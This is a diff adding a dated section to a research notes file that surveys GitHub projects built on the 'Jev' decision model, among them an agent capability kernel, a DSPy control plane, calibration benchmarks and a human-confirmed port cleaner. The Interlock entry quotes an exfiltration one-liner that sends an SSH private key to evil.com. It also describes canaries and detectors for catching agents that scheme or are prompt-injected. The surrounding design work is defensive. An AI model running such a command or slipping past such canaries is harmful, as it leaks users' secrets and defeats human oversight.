@@ -5433,3 +5433,405 @@ fail table); `validation.md` (jevgrep 79% top-5; Jev-RAG
 one-run; oxlint Phoenix fixtures); `faq.md`;
 `mental-models.md`; `methods-catalog.md`; `toolbox-mapping.md`;
 `agent-self-assessment.md`; `formal-methods.md`. No wrapper.
+
+## 59. Capability kernel, typed DSPy control plane, calibration arena + fan-out suite, engine-owns-truth chess coach, human-confirmed port cleanup (2026-09-18 ~19:48 Boise)
+
+America/Boise ~19:48 = 2026-09-19T01:48Z. Docs-only fold into
+open PR #2 (`cursor/augustus-store-envelope-00b4`). Not a
+competing PR. Archer 27B drop still **WATCH**. Identity lock vs
+`typesafe-ai` / `tenbin` / `decision-first` holds. No wrapper,
+no pip/hook/venv/.env/uv/npm/pnpm/wrangler how-to, no copied
+ports or key-file paths. No invented metrics. Do not re-fold
+§50–§58. TypeSafe Jev is the documented exemplar, not the
+monopoly. Augustus stays how-to-apply / mental model /
+architecture / toolbelt + jevals/Harbor practice — **not** a
+thin Jev skill.
+
+Five HIGH **usage / architecture / measurement** signals: a
+capability kernel (LLM ring 3; Interlock ring 0; Jev is a
+SENSOR; `policy.py` decides); a typed deterministic control
+plane around DSPy (classifier → ontology → security override
+→ confidence → state machine → tool allow-list; DSPy drafts
+AFTER route+action are fixed); a native-probability calibration
+arena plus a fan-out measurement-economics suite (sonar /
+vickrey / bracket); formal engine + soft judgment composition
+(Stockfish owns truth; Jev owns judgment); evidence-backed
+human-confirmed kill (Jev recommends; the human is the only
+trigger). Backend-agnostic categorization/scoring/decision-only
+class.
+
+Skip this pass: [`SPFreedom/jef-mcp`](https://github.com/SPFreedom/jef-mcp)
+(parody of TypeSafe Jev; description says so) and
+[`rayelzz/jevregist`](https://github.com/rayelzz/jevregist)
+(account farming / key-pool registrar). Do not index as
+placements.
+
+Star spike this day (watch numbers, then this-pass live):
+[`TheoLeeCJ/SemIf`](https://github.com/TheoLeeCJ/SemIf) 1491→1606
+(this pass **1607★**); [`vinnylarouge/jevlike`](https://github.com/vinnylarouge/jevlike)
+851→896 (this pass **897★**). Already-folded open-head /
+encoder-class neighbors; no new card.
+
+### HIGH
+
+1. **[`somoore/interlock`](https://github.com/somoore/interlock)**
+   (Python; MIT; created 2026-09-19T01:41:58Z; 0★ this pass).
+   Capability kernel: **the kernel the LLM is not allowed to
+   talk to.** Interlock is ring 0. The LLM is ring 3. An
+   untrusted agent never holds a real secret, never talks to
+   the network, and never sees the real filesystem. It works
+   on a **stunt-double** world: canary AWS keys, fake `.env`,
+   a closed allowlisted action space. Jev (or a bundled System
+   One stand-in) is the **sensor**. **`policy.py` is the
+   product.** The model never picks allow / ask / block.
+
+   Pipeline (README): LLM plans → Interlock kernel → (1)
+   deterministic detectors (C2, reverse shell, canaries,
+   paths) → (2) parallel Noul battery (twelve hazards,
+   ~100 ms) → (3) policy in ordinary code: BLOCK / ASK
+   (human) / ALLOW + placeholder swap at egress.
+
+   **Anti-pattern named in the README:** launch-week Jev
+   firewalls ask "is this tool call dangerous?" **after** the
+   LLM already decided, with **real secrets still in scope**.
+   Interlock changes the trust model: secrets never enter the
+   agent (placeholders and canaries only); canaries are
+   active (any use is a catch, including silent scheming with
+   no injection); the action space is closed (the kernel
+   cannot emit `curl evil.com?$(cat ~/.ssh/id_rsa)` because
+   that string is not an option); **type-safe is not the same
+   as correct** — irreversible actions stay behind a
+   threshold **and** a human. Prompt injection can hijack
+   intent; it cannot hijack the instruction set.
+
+   38-case regression set (attacks, benign, hard negatives /
+   authorized destruction): used to tune the local judge,
+   **not a blind paper**. Wire Jev and run your own held-out
+   attacks before you trust a number. `INTERLOCK_ARMED=1` is
+   theirs; do not copy pip / hook how-to.
+
+   **Do not merge with toolgate.**
+   [`fdemir/toolgate`](https://github.com/fdemir/toolgate)
+   is a pre-exec product on a *proposed* tool call (allow /
+   block / review) — real args may already be in scope; Jev
+   is still not authorization. Interlock is a **capability
+   kernel**: the LLM never saw the secret and cannot emit an
+   unlisted action. Same Leveson split (sensor ≠ constraint);
+   different trust boundary. rh-guard crossover: eval-integrity
+   / reward-hacking is a *different hole* from a ring-0
+   kernel; do not merge products. Placement: `mappings.md` §8
+   (sensor ≠ constraint) and §18 (closed action space as the
+   prove layer); `applied-mappings.md` §7; `mixed-architecture.md`
+   fail table. Pillar: org/safety (Leveson). Hole: gate.
+   Family: closed decision API as sensor. **Empirical** as
+   README architecture. **Hypothesis** as a shipped kernel
+   you can trust. No wrapper.
+
+2. **[`manikanda-kumar/jev-dspy-control-plane`](https://github.com/manikanda-kumar/jev-dspy-control-plane)**
+   (Python; MIT; created 2026-09-19T01:36:58Z; 0★; description
+   null this pass). Benchmark-first experiment: **can a
+   constrained classifier be a typed control plane around a
+   probabilistic DSPy agent?** Free-form banking-support cases
+   enter a closed ontology; deterministic confidence and
+   safety rules apply; only allow-listed tools may run; DSPy
+   drafts the customer-facing response **after** the route
+   and action are fixed. Engineering experiment, not a
+   production bank. Tools are deterministic mocks.
+
+   Three pipelines share ontology, dataset, state machine,
+   tool allow-list, and metrics: `jev` (OpenJEV System One,
+   OpenJEV Hugging Face NLI, or offline heuristic), `dspy`
+   (DSPy typed signature), `json_schema` (OpenAI-compatible
+   strict JSON Schema). Architecture: classifier adapter →
+   typed control plane (ontology validation → security
+   override → confidence thresholds → state-transition
+   validation → tool allow-list) → DSPy/template **after**
+   fixed route+action. An LLM may explain; it cannot add a
+   route, change the selected action, or invoke an unapproved
+   tool. Banking ontology: **10 intents / 39 sub-intents**.
+   Unknown combinations cannot silently pass. Fraud/security
+   forces a human-security path even if the classifier
+   predicts a routine intent.
+
+   Offline smoke uses a heuristic + labelled **contract
+   stubs**. A high offline score is **plumbing regression,
+   not model generalization** (synthetic generator and
+   heuristic share route vocabulary). Metrics named (Harbor-
+   shaped): intent/sub-intent accuracy; invalid-output /
+   policy-violation; abstention / coverage / selective
+   accuracy; Brier / ECE; repeated-run consistency; p50/p95
+   latency; per-category stress (clean / typo / code-mixed /
+   adversarial / ambiguous); token cost when a backend
+   exposes usage. **Accuracy alone is not enough.** A
+   negative result is also valuable (poor calibration on
+   banking language, multilingual miss, cost as the route
+   set grows) — next step is labelled calibration or a
+   hierarchical scorer, not a more persuasive chat response.
+
+   Mental model: Ax/DSPy stay **LM-program knob climbers**
+   (`optimizer-integration.md`). The control plane is
+   typed + deterministic and sits *around* the LM program,
+   not inside GEPA/MIPRO. Do not copy venv / `.env` how-to.
+   **Empirical** as README architecture + metric list.
+   **Hypothesis** as a measured OpenJEV vs DSPy vs JSON
+   Schema bake-off (offline stubs ≠ that bake-off). Cards:
+   `optimizer-integration.md`; `validation.md`; `faq.md`.
+
+3. **[`meetr1912/jev-arena`](https://github.com/meetr1912/jev-arena)**
+   (Python; MIT; created 2026-09-19T01:28:11Z; 0★) plus
+   sibling fan-out suite
+   [`jev-sonar`](https://github.com/meetr1912/jev-sonar)
+   (created 2026-09-19T01:30:34Z),
+   [`jev-vickrey`](https://github.com/meetr1912/jev-vickrey)
+   (created 2026-09-19T01:28:15Z),
+   [`jev-bracket`](https://github.com/meetr1912/jev-bracket)
+   (created 2026-09-19T01:28:20Z) — all MIT, Python, 0★.
+
+   **Arena (The Honesty Meter).** Calibration on
+   analytically-known worlds (biased coin, integer-count
+   urns, standard deck, uniform hidden integer). Collects
+   Jev's **native** `noul` / `choice` / `score` probabilities
+   — not verbalized "I'm 80% sure." Oracle stub Brier/ECE
+   **0.0000** (ground truth is exact, not sampled). Live
+   smoke: Jev assigns **0.89** to face "1" of a *fair* die —
+   miscalibration is visible, not a victory lap.
+
+   **Live run (theirs; `--live --trials 200 --seed 7`,
+   `jev-1.13.0`, committed under `results/`):** 145 binary
+   (`noul`) events, **Brier 0.0059**, log loss **0.5393**,
+   **ECE 0.0620**, **2 requests / 710 ms** (~3.6 ms/event;
+   13,566 in / 5,468 out). Always-0.5 Brier 0.0766 / ECE
+   0.1371. Oracle 0.0000. Jev is stochastic; an earlier run
+   scored Brier 0.0063 / ECE 0.0642. Reliability is
+   systematically **overconfident in the low bins** and
+   near-perfect in the high bins (e.g. [0.1, 0.2) pred
+   0.166 / emp 0.096, n=18; [0.9, 1.0) pred 0.920 / emp
+   0.950, n=2). Categorical 55 events: multiclass Brier
+   **0.1915**, cross-entropy 2.0571; damage concentrated in
+   weighted-die and deck (ECE 0.109 / 0.084). Risk-coverage:
+   decisiveness `d = |p-0.5|*2`; `d ≥ 0.25` covers **76.6%**
+   at **100%** accuracy; `d ≥ 0.10` covers 94.5% at 99.3%.
+   Fan-out as **measurement economics**: 200 questions in 2
+   requests. Offline default; CI has no secrets. Cite these
+   numbers as *theirs*; do not invent a re-run.
+
+   **Sonar — heatmap-as-policy.** Battleship: ~100 `noul`
+   per turn ("will firing here hit?") + one `choice`;
+   `noul` argmax is the shot (ties → lowest row, then
+   column). Live empty board: **101 questions in 0.454 s**.
+   Offline oracle 20 games seed 11: win **75%**, per-shot
+   Brier **0.1615** vs 0.25 always-0.5. Live one game:
+   0W/1L, Brier **0.1092** — small sample; the point is
+   per-turn fan-out + field calibration. Status:
+   implementation tracked in the suite; design done.
+
+   **Vickrey — threshold fan-out CDF.** Jev **never bids**.
+   ~11 `noul` threshold probes + one `choice` band + one
+   `score`; code monotonizes the CDF and bids. Second-price
+   truthfulness is weakly dominant, so miscalibration *is*
+   the loss. Live 20 rounds: Brier **0.1391**, ECE
+   **0.1321**, under-confident at 0/1 thresholds;
+   second-price profit **-163.4**; coarse `choice` band MAE
+   **$26.86** beat the threshold-CDF estimate. Offline
+   oracle second-price regret **0.0** / truthfulness
+   **0.0000**. Overconfident stub loses money (teeth).
+   Synthetic; no real marketplace.
+
+   **Bracket — tournament Brier vs Elo.** 32 synthetic
+   teams; one `noul` per matchup; 5 requests / 31 questions
+   / **1.19 s** live. Live: Jev Brier **0.2853** vs Elo
+   **0.2322** vs seed **0.4077** vs oracle **0.2204**;
+   overconfident ECE **0.1965**; **+0.300 vs seed, −0.229
+   vs Elo.** Honest: trailed Elo. Offline oracle Brier
+   **0.2282**. This is **not** the rejected 255-way Choice
+   tournament (SKILL non-negotiable): engine-owned matchups,
+   scalar `noul` per game, scored with a proper rule.
+
+   Harbor / jevals-shaped practice: native probabilities,
+   exact oracle, Brier/ECE/reliability/risk-coverage, teeth
+   stubs, offline default. Cards: `validation.md`;
+   `faq.md` (native ≠ verbalized confidence); `methods-catalog.md`;
+   `toolbox-mapping.md`. **Empirical** as their live/offline
+   cards. No wrapper.
+
+4. **[`JoelLewis/game-coach`](https://github.com/JoelLewis/game-coach)**
+   (TypeScript; **GPL-3.0-only**; created 2026-09-19T01:08:53Z;
+   0★). Browser chess coach on Cloudflare. README status:
+   **Wave 0** (scaffold and Jev feasibility spike). Product
+   spec: `docs/PRD.md`. Treat the PRD as **Empirical as spec**;
+   the shipped product is **Hypothesis**.
+
+   Three-layer composition: **Stockfish (WASM) owns truth**
+   about the position (eval, best line, swing). **Jev owns
+   judgment** after every player move (severity, error class,
+   interrupt, teachable, template, theme, …). Templates + a
+   small writing model own the words. Jev never evaluates
+   positions or picks moves. Code owns the workflow
+   (thresholds, weighting, the final action). Silence is a
+   feature.
+
+   PRD envelope (theirs; not a how-to): 11 parallel questions
+   per move; interrupt if `interrupt_now ≥ 0.7` AND
+   `severity ≥ 2` AND confidence `≥ 0.6`; writing model only
+   if `teachable ≥ 0.8`, cap **3/game** plus one narrative;
+   confidence `< 0.4` → silent, flagged for review. Cost
+   model ~**$0.012** per chess game (Jev ~$0.003; writing
+   model is the main dial). Calibration *targets* (not
+   results): severity ≥80% exact / ≥95% adjacent; interrupt
+   precision ≥85% at 0.7; teachable precision ≥75% at 0.8;
+   ECE within 10 points per bin. Do not copy Wrangler /
+   Workers AI binding as a how-to.
+
+   Anti-soundness-theater exemplar **alongside** egma-ai
+   attention≠correctness (`notes.md` §58): an engine number
+   is not a coaching verdict; a Noul is not a proof the move
+   was a blunder. Formal methods compose with soft judgment
+   without laundering the Noul as Stockfish. Cards:
+   `formal-methods.md`; `mixed-architecture.md`; `faq.md`.
+   Pillar: search/control + formal. Hole: gate (interrupt) /
+   triage (error class). Family: closed decision API.
+
+5. **[`epiphany-dynamics/port-cleanup`](https://github.com/epiphany-dynamics/port-cleanup)**
+   (Swift; MIT; created 2026-09-19T00:58:50Z; 0★). Native
+   macOS utility: evidence-backed, **human-confirmed**
+   cleanup of stale listening TCP ports. Never kills
+   automatically. Jev recommends Stop / Keep open / Your
+   decision; the human is the only kill trigger (select row,
+   red button, confirm the exact list). Before SIGTERM the
+   app re-checks UID, executable path, microsecond start
+   identity, cwd, shield status, and exact listening
+   endpoints — and re-checks again immediately before
+   signalling. A changed or protected process is skipped.
+   Shields (executable + project folder + exact port set)
+   **override Jev**. A familiar product name alone is not a
+   keep rule.
+
+   Displayed explanations are **app-owned mapped text** from
+   validated typed responses, **not raw model prose**. Kill
+   recommendations need confidence **≥ 0.8** and evidence the
+   current provenance adapter supports; unsupported claims
+   fall back to "Your decision." One paid request per explicit
+   click; no retry, no background polling. API failure leaves
+   local evidence intact. TCP only; no privileged helper;
+   tiny final race remains (macOS has no pidfd-style checked
+   kill). Gate UX pattern for Augustus + rh-guard cousin:
+   judge proposes; policy + identity check + human confirm
+   the irreversible act; mapped reasons so the model never
+   owns the words the operator reads. Distinct from toolgate
+   (pre-exec of a proposed agent tool) and from interlock
+   (secrets never in the agent). Cards:
+   `applied-mappings.md` §7; `mixed-architecture.md` fail
+   table; `agent-self-assessment.md`. **Empirical** as README
+   safety model. Do not copy Keychain / `swift run` how-to.
+
+### MED (toolbelt / patterns; brief)
+
+- **[`1jehuang/jev-pr-labeler`](https://github.com/1jehuang/jev-pr-labeler)**
+  (Python; MIT; created 2026-09-19T01:07:20Z; 0★). Semantic
+  PR labels by **conceptual scope, not line counts**. Fixed
+  taxonomy; the model never invents names. Default confidence
+  **0.75** (lower of confidence and selected-choice p);
+  unknown/low-conf abstain. `security` and `breaking-change`
+  are never automatically removed. Manual workflow-state
+  labels (`needs-tests` / `blocked` / `ready-to-merge`) are
+  never proposed by Jev. Labels must not authorize merges.
+  Line counts detect patch truncation only. Do not copy
+  Actions SHA / OpenRouter key how-to.
+- **[`RubyBrewsday/jevcumber`](https://github.com/RubyBrewsday/jevcumber)**
+  (TypeScript; MIT; created 2026-09-19T01:05:17Z; 0★).
+  Cucumber `.feature` only — no step-definition glue. Jev
+  **picks among observed controls and literals already in the
+  step**; never writes code or invents values. Lockfile
+  (`*.feature.lock.json`) makes replay deterministic (no API
+  in CI `--frozen`). Refuse below confidence **0.6**.
+  Meaning-as-spec: Gherkin is the spec; resolution is a
+  pointer among candidates the page already shows. Same
+  family as applied-mappings §2 / Stagehand pick-and-copy /
+  jev-e2e. Do not copy npm-from-GitHub-tarball how-to.
+- **[`shkumbinhasani/typedecide`](https://github.com/shkumbinhasani/typedecide)**
+  (TypeScript; MIT; created 2026-09-19T00:51:14Z; 0★).
+  Provider-agnostic TS SDK for **decision models** (`d.choice`
+  / `d.probability` / `d.score`); TypeSafe + OpenRouter
+  adapters; capability-checked at compile time. Pre-release;
+  **not on npm**. Class SDK, not a TypeSafe how-to. Noul has
+  no provider confidence — they refuse to invent one.
+- **[`douglance/jevon`](https://github.com/douglance/jevon)**
+  (Rust; MIT; created 2026-09-19T01:43:33Z; 0★). `jev` CLI +
+  MCP for the TypeSafe API (not the SDK; that is
+  `typesafe-sdk-rs`). Commands annotated read-only. `jev mcp
+  add` writes **no environment** — a key does not belong in
+  an agent config file. Toolbelt, not a placement.
+- **[`buberlo/dsh-jev`](https://github.com/buberlo/dsh-jev)**
+  (TypeScript; MIT; created 2026-09-19T00:49:47Z; 0★). Jev
+  decision layer for DeepSeek Harness. A model answer can
+  only **gate** (`ask` / `hold` / `deny`), never widen a
+  permission. Failure never produces an allow. Live TypeSafe
+  **not executed** this repo (mock tests). Not published to
+  npm. Shadow mode still transmits state — logged as a
+  warning. Cousin of toolgate / dsh plugin surface.
+- **[`zaycruz/fast-jev-compaction-pi`](https://github.com/zaycruz/fast-jev-compaction-pi)**
+  (TypeScript; MIT; created 2026-09-19T00:55:54Z; 0★). pi
+  port of `tamaratran/fast-jev-compaction`: verbatim drop,
+  never summarize; `session_before_compact`. Their bench
+  (large, real Jev): compaction ~**50×** faster than pi's
+  LLM summary; pure mode drops old tool calls; 
+  `preserveCallInputs: true` restores 35/35 commands + 14/14
+  paths. Fallback to built-in summary on any failure. Same
+  *job* as fast-jev-compaction / gliner25-compaction; host is
+  pi. Do not copy `pi install` how-to.
+- **[`planstack-ai/jev-tetris-benchmark`](https://github.com/planstack-ai/jev-tetris-benchmark)**
+  (TypeScript; MIT; created 2026-09-19T01:18:24Z; 0★).
+  Harbor-shaped Tetris: code enumerates ≤12 legal placements;
+  Jev Choice vs Claude Haiku 4.5 under identical boards. Use-
+  case demo, **not a rigorous eval**. Same "legal set in
+  code, model picks" hole as jev-plays-games / jev-testbench.
+- **[`fabricioctelles/modelsystem`](https://github.com/fabricioctelles/modelsystem)**
+  (license MIT; language null; created 2026-09-19T01:18:12Z;
+  **1★**). Public contribution surface for
+  [modelsystem.one](https://modelsystem.one) — curated catalog
+  of System One / decision models. Independent; **not
+  affiliated** with TypeSafe. Cousin of jevable.com (living
+  atlas) at catalog-of-models rather than catalog-of-apps.
+- **[`emirbartu/opencode-system-one`](https://github.com/emirbartu/opencode-system-one)**
+  (TypeScript; **license null this pass**; created
+  2026-09-19T00:28:02Z; **1★**). OpenCode V2 plugin: Jev via
+  OpenRouter alpha Decisions for skill/tool routing. Every
+  call **fails open**. Tail of conversation including
+  tool-result bodies is sent (up to `stateBudget`). Not
+  affiliated with OpenCode. Do not copy plugin JSON.
+- **[`phanngoc/browser-ai`](https://github.com/phanngoc/browser-ai)**
+  (MIT; language null this pass; created 2026-09-19T01:23:13Z;
+  0★). Jev-driven browser agent in pure Go (CDP pipe or
+  attach). Built to measure real end-to-end speed. Status:
+  **design done, implementation tracked**. Cousin of
+  jev-ultrafast (Python). Do not invent a vs-Ultrafast table.
+- **[`acorn181/semantic-bookmark`](https://github.com/acorn181/semantic-bookmark)**
+  (TypeScript; MIT; created 2026-09-19T01:35:18Z; 0★).
+  User-authored semantic bookmark rules; Jev classifies the
+  page; Chrome performs the deterministic action. Early
+  prototype; key in `chrome.storage.local`. English-as-config
+  cousin of hunch, on bookmarks rather than Ruby control flow.
+
+### Omni / Jev-omni / Archer
+
+Still **WATCH**. No Hub weights. A capability kernel, a
+control plane around DSPy, a native-probability arena, a
+Wave 0 chess PRD, and a human-confirmed port killer are
+**not** that drop. Stockfish WASM is text-state + engine
+eval, not pixels.
+
+### Cross-links
+
+Cards: `applied-mappings.md` §2 (jevcumber), §7 (capability
+kernel + human-confirmed gate); `mappings.md` §8 (interlock
+sensor≠constraint), §18 (closed action space / human kill);
+`mixed-architecture.md` (fail table + gallery: kernel,
+control plane, engine-owns-truth, mapped explanations);
+`validation.md` (jev-arena Brier/ECE; dspy-control-plane
+metrics; tetris demo; sonar/vickrey/bracket); `faq.md`
+(type-safe ≠ correct; Jev is sensor not policy; Ax/DSPy
+knobs vs control plane; native vs verbalized confidence);
+`optimizer-integration.md`; `formal-methods.md` (Stockfish
+truth / Jev judgment; anti-soundness-theater); `mental-models.md`;
+`methods-catalog.md`; `toolbox-mapping.md`;
+`agent-self-assessment.md`. No wrapper.
